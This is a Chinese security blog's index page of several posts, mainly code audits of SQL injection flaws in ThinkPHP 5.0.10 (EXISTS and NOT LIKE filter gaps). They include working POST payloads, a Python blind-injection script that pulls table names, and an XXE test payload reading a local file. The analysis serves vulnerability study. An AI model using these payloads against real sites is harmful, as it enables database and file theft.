<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注/" itemprop="url">代码审计 |  thinkphp5.0.10函数过滤不全导致一处盲注</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T09:15:41+08:00">
                2018-09-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>跟着P师傅后面捡洞不容易,洞虽然撞了,但毕竟是自己审出来的,还是分析记录一波</p>
</blockquote>
<hr>
<p>##<strong>1.基础知识:</strong><br>A.<code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" alt="image_2co63sh5e1locbbe1l3epu38hqm.png-91.1kB"><br>更多基础知识可参考文章：<br><a href="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP</a></p>
<p>##<strong>2.环境搭建:</strong><br>A.index.php</p>
<pre><code>#application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use think\Db;
use think\Controller;
class Index extends Controller
{
    public function index()
    {
        $post_user = input(&apos;post.user/a&apos;);
        $a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
        var_dump($a);
    }
}
</code></pre><p>B.对应数据库下新建表<code>user</code>  <code>gather</code></p>
<p><strong>3.漏洞利用:</strong><br>payload：</p>
<pre><code>post:
user[0]=EXISTS&amp;user[1]=select * from user where 1=1  √
user[0]=EXISTS&amp;user[1]=select * from user where 1=2  ×
</code></pre><p><img src="http://static.zybuluo.com/chhyx/79u46kfp4fetv0n47w75geqi/image_1co76r19t151vpd83b721qq4r5i.png" alt="image_1co76r19t151vpd83b721qq4r5i.png-42.8kB"><br><img src="http://static.zybuluo.com/chhyx/kbnpxx1fq21u73e3x3rxgmvz/image_1co76sdqv1svb13ae158d1g3l7tl6c.png" alt="image_1co76sdqv1svb13ae158d1g3l7tl6c.png-35.7kB"></p>
<p>##<strong>4.代码审计:</strong><br><strong>造成漏洞的原因与上篇文章一样,都是函数过滤不全导致的注入问题</strong><br>首先从<code>index.php</code>开始分析:</p>
<pre><code>$a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
</code></pre><p>A.跟进<code>thinkphp\library\think\db\Query.php</code>的<code>select()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\Query.php 2290行
public function select($data = null)
...
if (false === $resultSet) {
        // 生成查询SQL
        $sql = $this-&gt;builder-&gt;select($options);
        // 获取参数绑定
        $bind = $this-&gt;getBind();
...
</code></pre><p>B.跟进<code>thinkphp\library\think\db\bulider.php</code>的<code>select()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 692行
</code></pre><p><img src="http://static.zybuluo.com/chhyx/b7xufwpqmq4qphlyytfivelj/image_1co76e4lql0519tvp9f10inbd648.png" alt="image_1co63sh5e1locbbe1l3epu38hqm.png-91.1kB"></p>
<p>C.跟进<code>parseWhere()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\bulider.php 224行
protected function parseWhere($where, $options)
{   
    $whereStr = $this-&gt;buildWhere($where, $options);//跟进
    if (!empty($options[&apos;soft_delete&apos;])) {
        // 附加软删除条件
        list($field, $condition) = $options[&apos;soft_delete&apos;];
        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        $whereStr = $whereStr ? &apos;( &apos; . $whereStr . &apos; ) AND &apos; : &apos;&apos;;
        $whereStr = $whereStr . $this-&gt;parseWhereItem($field, $condition, &apos;&apos;, $options, $binds);
    }
    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;
}
</code></pre><p>D.跟进<code>buildWhere()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 245行
public function buildWhere($where, $options)
    { 
    ...
    $whereStr = &apos;&apos;;
    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        foreach ($where as $key =&gt; $val) {
            $str = [];
......
else {//进入
                    // 对字段使用表达式查询
    $field = is_string($field) ? $field : &apos;&apos;;
    $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);

 }
        }

        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
    }

    return $whereStr;
</code></pre><p>E.跟进核心函数<code>parseWhereItem()</code>：</p>
<pre><code>#thinkphp\library\think\db\bulider.php 300行
protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
    {
    ...
    // 检测操作符
    if (!in_array($exp, $this-&gt;exp)) {//进入
        $exp = strtolower($exp);
        if (isset($this-&gt;exp[$exp])) {
            $exp = $this-&gt;exp[$exp];
            //$exp:EXISTS
        } 
    ...
    $whereStr = &apos;&apos;;
    ...
    //exists操作有关代码
    elseif (in_array($exp, [&apos;NOT EXISTS&apos;, &apos;EXISTS&apos;])) {
        //$exp:EXISTS  $value:select * from user where 1=1
        if ($value instanceof \Closure) {
            $whereStr .= $exp . &apos; &apos; . $this-&gt;parseClosure($value);
        } else {
            $whereStr .= $exp . &apos; (&apos; . $value . &apos;)&apos;;
            //$whereStr:EXISTS (select * from user where 1=1
        }
</code></pre><p>可以看到我们TP框架并没有对我们传输进去的<code>$value</code>进行过滤 而直接拼接到<code>$whereStr</code>变量 最后拼接到<code>$sql</code>语句中 导致注入</p>
<p>F.我们看下tp框架系统核心函数之一的<code>input()</code>函数,它的功能是帮助我们获取各种变量及自动过滤:<br>我们跟进<code>thinkphp\library\think\Requests.php</code>的<code>input()</code>函数：<br>我们查看过滤器相关代码:</p>
<pre><code>#thinkphp\library\think\Requests.php 971行
public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)
...   
$filter = $this-&gt;getFilter($filter, $default);
if (is_array($data)) {
    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);
    reset($data);
} else {
    $this-&gt;filterValue($data, $name, $filter);
}

if (isset($type) &amp;&amp; $data !== $default) {
    // 强制类型转换
    $this-&gt;typeCast($data, $type);
}
return $data;
</code></pre><p>G.这里判断了变量是否为数组 这里调用了<code>filterValue()</code>函数进行过滤 跟进函数:</p>
<pre><code>#thinkphp\library\think\Requests.php 1054行
private function filterValue(&amp;$value, $key, $filters)
{
...
return $this-&gt;filterExp($value);
}
</code></pre><p>跟进<code>filterExp()</code>函数:</p>
<pre><code>public function filterExp(&amp;$value)
{
// 过滤查询特殊字符
if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) {
    $value .= &apos; &apos;;
}
// TODO 其他安全过滤
}
</code></pre><p>H.这个函数的作用很简单,判断传进来的表达式是否属于敏感关键字,如果是—&gt;关键字后加空格,来进行给过滤<br>如传进来的post数据:</p>
<pre><code>x[0]=in&amp;x[1]=1
</code></pre><p>服务器接收时如果没有进行过滤:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in&apos;=&gt;&apos;1&apos;)
</code></pre><p>如果被<code>filterExp()</code>过滤后:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in &apos;=&gt;&apos;1&apos;)
</code></pre><p>这样就无法被服务器解析 也就避免了漏洞</p>
<p>I.但是因为TP5重写了数据库操作的方法,忽略了一些敏感操作 导致我们可以绕过TP的过滤机制</p>
<pre><code>#thinkphp\library\think\db\bulider.php 重写表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/a3hij28f4rsix5nv4bwd7z5d/image_1co76cjk27kqo00i3auj21f3l3c.png" alt="image_1co76cjk27kqo00i3auj21f3l3c.png-52.1kB"></p>
<pre><code>#thinkphp\library\think\Requests.php  过滤表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/b7xufwpqmq4qphlyytfivelj/image_1co76e4lql0519tvp9f10inbd648.png" alt="image_1co76e4lql0519tvp9f10inbd648.png-23.4kB"></p>
<p>我们可看到这里并没有对<code>exists</code>、<code>NOT EXISTS</code>、<code>notexists</code>等表达式进行过滤,导致了注入。</p>
<p>这里写了一个py盲注出数据表的脚本:</p>
<pre><code>#!/usr/bin/python
# encoding: utf-8
import requests

string = &apos;abcdefghijklmnopqrstuvwxyzAbCDEFGHIJKLMNOPQRSTUVWXYZ_&apos;
url = &apos;http://127.0.0.1:82/public/index.php/index/index/index&apos;
headers = {
&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0)       Gecko/20100101 Firefox/46.0&apos;,
&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;
}    
//传入table的长度即可
def get_table_name(table_length):
result_table_name = &apos;&apos;
flag = 0
for i in range(0,table_length+1):
    if flag:
        break;
    for char in string:
        data=&apos;&apos;&apos;user[0]=EXISTS&amp;user[1]=select * from user where (SELECT 1 FROM information_schema.tables WHERE 
            TABLE_SCHEMA=&quot;tp&quot; AND table_name REGEXP &apos;^%s[a-z]&apos; LIMIT 0,1)&apos;&apos;&apos;%(result_table_name+char)
        re = requests.post(url,data=data,headers=headers)
        if &apos;array(3)&apos; in re.text and re.status_code == 200:
            result_table_name += char
            print &apos;result_table_name:&apos;+result_table_name
            if(i == table_length-2):
                for chr2 in string:
                    data = &apos;&apos;&apos;user[0]=EXISTS&amp;user[1]=select * from user where (SELECT 1 FROM information_schema.tables WHERE 
                                TABLE_SCHEMA=&quot;tp&quot; AND table_name REGEXP &apos;^%s[a-%s]&apos; LIMIT 0,1)&apos;&apos;&apos;%(result_table_name,chr2)
                    re = requests.post(url,data=data,headers=headers)
                    if &apos;array(3)&apos; in re.text and re.status_code == 200:
                        result_table_name += chr2
                        print &apos;result_table_name:&apos;+result_table_name
                        break
            flag = 0
            break
print &apos;[+]result_table_name:&apos;+result_table_name    

get_table_name(6)//运行函数
</code></pre><p><img src="http://static.zybuluo.com/chhyx/ccs5d8sokh6yvo2gd578o95r/image_1co7pdni110vd2731um1p352fr9.png" alt="image_1co7pdni110vd2731um1p352fr9.png-107.4kB"></p>
<p>由于笔者对sql注入不是很擅长,等有时间总结一波再返回来再改脚本。</p>
<p><strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118044</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/25/thinkphp5.0.10函数过滤不全导致注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/25/thinkphp5.0.10函数过滤不全导致注入/" itemprop="url">代码审计 |  thinkphp5.0.10函数过滤不全导致注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-25T08:15:41+08:00">
                2018-09-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>中秋过了,博客开始更新,这两天审计TP框架,跟着P师傅的思路发现了一些问题,这里分析记录一波</p>
</blockquote>
<hr>
<p>##<strong>1.基础知识</strong><br>A.<code>Thinkphp</code>的一些基本操作<br><img src="http://static.zybuluo.com/chhyx/3sb6ttvy8bj5pf1o3wqj1am2/image_1cne0gl8i1jo21s7mj8l7qg1c0220.png" alt="image_2co63sh5e1locbbe1l3epu38hqm.png-91.1kB"><br>更多基础知识可参考文章：<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP</a></p>
<p>##<strong>2.环境搭建:</strong><br>A.index.php</p>
<pre><code>#application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use think\Db;
use think\Controller;
class Index extends Controller
{
    public function index()
    {
        $post_user = input(&apos;post.user/a&apos;);
        $a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
        var_dump($a);
    }
}
</code></pre><p>B.对应数据库下新建表<code>user</code></p>
<p>##<strong>3.漏洞利用:</strong><br>payload：</p>
<pre><code>post:user[0]=not like&amp;user[1][0]=aaa&amp;user[1][3]=bbb&amp;user[2]=) and 1=2 union select 1,user(),3 from user--
</code></pre><p><img src="http://static.zybuluo.com/chhyx/ycb34r3alak730vb82c9b6io/image_1co63bm74pidqmhrj148h6db2c.png" alt="image_1co63bm74pidqmhrj148h6db2c.png-43.6kB"></p>
<p>##<strong>4.代码审计:</strong><br><strong>相关变量已经写到注释中</strong><br>首先从<code>index.php</code>开始分析:</p>
<pre><code>$a = Db::table(&apos;user&apos;)-&gt;where(array(&apos;ID&apos; =&gt; $post_user))-&gt;select();
</code></pre><p>A.跟进<code>thinkphp\library\think\db\Query.php</code>的<code>select()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\Query.php 2290行
public function select($data = null)
...
if (false === $resultSet) {
        // 生成查询SQL
        $sql = $this-&gt;builder-&gt;select($options);
        // 获取参数绑定
        $bind = $this-&gt;getBind();
...
</code></pre><p>B.跟进<code>thinkphp\library\think\db\bulider.php</code>的<code>select()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 692行
</code></pre><p><img src="http://static.zybuluo.com/chhyx/561s2vvojdrgh5ahacqn8cky/image_1co63sh5e1locbbe1l3epu38hqm.png" alt="image_1co63sh5e1locbbe1l3epu38hqm.png-91.1kB"></p>
<p>C.跟进<code>parseWhere()</code>函数:</p>
<pre><code>#thinkphp\library\think\db\bulider.php 224行
protected function parseWhere($where, $options)
{   
    $whereStr = $this-&gt;buildWhere($where, $options);//跟进
    if (!empty($options[&apos;soft_delete&apos;])) {
        // 附加软删除条件
        list($field, $condition) = $options[&apos;soft_delete&apos;];
        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        $whereStr = $whereStr ? &apos;( &apos; . $whereStr . &apos; ) AND &apos; : &apos;&apos;;
        $whereStr = $whereStr . $this-&gt;parseWhereItem($field, $condition, &apos;&apos;, $options, $binds);
    }
    return empty($whereStr) ? &apos;&apos; : &apos; WHERE &apos; . $whereStr;
}
</code></pre><p>D.跟进<code>buildWhere()</code>函数</p>
<pre><code>#thinkphp\library\think\db\bulider.php 245行
public function buildWhere($where, $options)
    { 
    ...
    $whereStr = &apos;&apos;;
    $binds    = $this-&gt;query-&gt;getFieldsBind($options[&apos;table&apos;]);
        foreach ($where as $key =&gt; $val) {
            $str = [];
......
else {//进入
                    // 对字段使用表达式查询
    $field = is_string($field) ? $field : &apos;&apos;;
    $str[] = &apos; &apos; . $key . &apos; &apos; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);

 }
        }

        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
    }

    return $whereStr;
</code></pre><p>E.跟进核心函数<code>parseWhereItem()</code>：</p>
<pre><code>#thinkphp\library\think\db\bulider.php 300行
protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
    {
    ...
    // 检测操作符
    if (!in_array($exp, $this-&gt;exp)) {//进入
        $exp = strtolower($exp);
        if (isset($this-&gt;exp[$exp])) {
            $exp = $this-&gt;exp[$exp];
            //$exp:NOT LIKE
        } 
    ...
    $whereStr = &apos;&apos;;
    ...
    //like操作有关代码
    elseif (&apos;LIKE&apos; == $exp || &apos;NOT LIKE&apos; == $exp) {
        // 模糊匹配
        //$value:{ [0]=&gt;&quot;aaa&quot; [1]=&gt;&quot;bbb&quot; } 
        if (is_array($value)) {
            foreach ($value as $item) {
                $array[] = $key . &apos; &apos; . $exp . &apos; &apos; . $this-&gt;parseValue($item, $field);

            }
            $logic = isset($val[2]) ? $val[2] : &apos;AND&apos;;
            //$logic:) and 1=2 union select 1,user(),3 from user--
            //$array:`ID` NOT LIKE &apos;12&apos; 
            $whereStr .= &apos;(&apos; . implode($array, &apos; &apos; . strtoupper($logic) . &apos; &apos;) . &apos;)&apos;;
            //$whereStr:(`ID` NOT LIKE &apos;aaa&apos; ) AND 1=2 UNION SELECT 1,USER(),3 FROM USER-- `ID` NOT LIKE &apos;bbb&apos;)
        } 
</code></pre><p>可以看到我们TP框架并没有对我们传输进去的<code>$val</code>进行过滤 而直接拼接到<code>$whereStr</code>变量 最后拼接到<code>$sql</code>语句中 导致注入</p>
<p>F.我们看下tp框架系统核心函数之一的<code>input()</code>函数,它的功能是帮助我们获取各种变量及自动过滤:<br>我们跟进<code>thinkphp\library\think\Requests.php</code>的<code>input()</code>函数：<br>我们查看过滤器相关代码:</p>
<pre><code>#thinkphp\library\think\Requests.php 971行
public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)
...   
$filter = $this-&gt;getFilter($filter, $default);
if (is_array($data)) {
    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);
    reset($data);
} else {
    $this-&gt;filterValue($data, $name, $filter);
}

if (isset($type) &amp;&amp; $data !== $default) {
    // 强制类型转换
    $this-&gt;typeCast($data, $type);
}
return $data;
</code></pre><p>G.这里判断了变量是否为数组 这里调用了<code>filterValue()</code>函数进行过滤 跟进函数:</p>
<pre><code>#thinkphp\library\think\Requests.php 1054行
private function filterValue(&amp;$value, $key, $filters)
{
...
return $this-&gt;filterExp($value);
}
</code></pre><p>跟进<code>filterExp()</code>函数:</p>
<pre><code>public function filterExp(&amp;$value)
{
// 过滤查询特殊字符
if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) {
    $value .= &apos; &apos;;
}
// TODO 其他安全过滤
}
</code></pre><p>H.这个函数的作用很简单,判断传进来的表达式是否属于敏感关键字,如果是—&gt;关键字后加空格,来进行给过滤<br>如传进来的post数据:</p>
<pre><code>x[0]=in&amp;x[1]=1
</code></pre><p>服务器接收时如果没有进行过滤:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in&apos;=&gt;&apos;1&apos;)
</code></pre><p>如果被<code>filterExp()</code>过滤后:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in &apos;=&gt;&apos;1&apos;)
</code></pre><p>这样就无法被服务器解析 也就避免了漏洞</p>
<p>I.但是因为TP5重写了数据库操作的方法,忽略了一些敏感操作 导致我们可以绕过TP的过滤机制</p>
<pre><code>#thinkphp\library\think\db\bulider.php 重写表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/et4fjnsfd12qyuq4brr50wqv/image_1co66mlsb18vjivu13ld1c9tgv49.png" alt="image_1co66mlsb18vjivu13ld1c9tgv49.png-61kB"></p>
<pre><code>#thinkphp\library\think\Requests.php  过滤表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/fj5jkb1ax2z3mkcepx3wykfp/image_1co66ji7v9gm1os31p9hpgjj9o20.png" alt="image_1co66ji7v9gm1os31p9hpgjj9o20.png-26.2kB"></p>
<p>我们可看到这里漏掉了<code>not like</code>这个表达式(添加了一个表达式 但是并没有进行过滤),导致了注入。</p>
<p>##<strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118044</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/代码审计Day3 - 实例化任意对象漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/20/代码审计Day3 - 实例化任意对象漏洞/" itemprop="url">代码审计Day3 - 实例化任意对象漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-20T23:15:41+08:00">
                2018-09-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<p>##<strong>Day 3 - Snow Flake</strong></p>
<p>###题目名字:雪花<br>代码如下:<br><img src="http://static.zybuluo.com/chhyx/3skmkh8igvlxdywp9qfrzdr8/image_1cnrfif3p1clakuvd7p1s0g1muv9.png" alt="image_1cnrfif3p1clakuvd7p1s0g1muv9.png-213.8kB"></p>
<p>###<strong>漏洞产生</strong>:这里的代码存在两个问题<br>1.文件包含漏洞 <code>class_exists($controllerName)</code>当用class_exists()这个函数时 它将会默认调用antoload()这个函数 由于类名我们可控 所以会造成文件包含</p>
<p>我们看下class_exists()函数</p>
<blockquote>
<p><strong>class_exists()</strong>  (PHP 4, PHP 5, PHP 7)<br>定义:class_exists — 检查指定的类是否已定义。<br>参数:bool class_exists ( string \$class_name [, bool \$autoload = true ] )</p>
</blockquote>
<p>class_exists() 默认将会尝试调用 <code>__autoload</code>，如果不想让 class_exists() 调用 <code>__autoload</code>，可以将 <code>autoload</code> 参数设为 FALSE。<br>2.在代码中的第九行,由于实例化的对象名<code>$controllerName</code>以及传入类的参数名<code>$data</code>是我们可以控制的 我们就可以去调用PHP内置类<code>SimpleXMLElement</code>来执行xxe攻击读取任意文件</p>
<p>测试代码:</p>
<pre><code> &lt;?php

$xml = &apos;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT methodName ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///C:/sec/1.txt&quot;&gt;]&gt;&lt;methodCall&gt; &lt;methodName&gt;&amp;xxe;&lt;/methodName&gt;&lt;/methodCall&gt;&apos;;

$xml_class = new SimpleXMLElement($xml,LIBXML_NOENT);
var_dump($xml_class);

?&gt;
</code></pre><p><img src="http://static.zybuluo.com/chhyx/gl70z7his5l5e30ssvenwdwl/image_1cnrhc09s50p1f7311rv9k8ah51l.png" alt="image_1cnrhc09s50p1f7311rv9k8ah51l.png-59kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/PDO的来龙去脉/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/20/PDO的来龙去脉/" itemprop="url">PHP基础 | PDO的来龙去脉</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-20T08:15:41+08:00">
                2018-09-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

